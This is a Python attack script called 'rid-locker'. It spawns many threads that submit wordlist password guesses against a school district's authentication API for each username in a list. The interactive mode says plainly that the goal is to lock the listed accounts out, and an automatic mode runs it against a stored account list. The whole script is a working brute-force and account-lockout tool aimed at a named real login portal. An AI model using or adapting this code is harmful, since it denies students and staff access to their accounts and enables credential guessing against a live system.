 #!/usr/bin/env python3

import requests
import rid_api
from threading import Thread
from itertools import islice
import time
import sys

if '--interactive-mode' in sys.argv:
    interactive_mode = True
    print("Interactive mode enabled")
else:
    interactive_mode = False

#Interactive mode - get variables
if interactive_mode:
    name_file = open(input("Name list file: "))
    thread_count = int(input("Thread count: "))
    words_per_thread = int(input("Words per thread: "))
    name_list = name_file.read().splitlines()

    print("Accounts to be locked:")

    for username in name_list:
        print(username)

    print("Locking in 10 seconds, press Ctrl+C to cancel")
    time.sleep(10)
    print("Initializing threads...")
    time.sleep(2)

#Automatic mode - use build-in variables
else:
    name_file = open("/mnt/data/rid-locker/account_list")
    name_list = name_file.read().splitlines()
    thread_count = 100
    words_per_thread = 100

name_list_parsed = content = [x for x in name_list if not x.startswith('#')]

#Set static variables
api_url = "https://portal.id.cps.edu/api/rest/authn"
wordlist = '/mnt/data/rid-locker/all_in_one_w'

#Iterate through usernames in list
for username in name_list_parsed:
    with open(wordlist) as f:
        for i in range(0,thread_count):
            #Split list of words into slices for multi-threaded processing
            next_n_lines = list(islice(f, words_per_thread))
            #Stop if no more words to avoid exception
            if not next_n_lines:
                break
            Thread(target=rid_api.test_list, args=(requests.session(), api_url, username, next_n_lines)).start()
    time.sleep(60)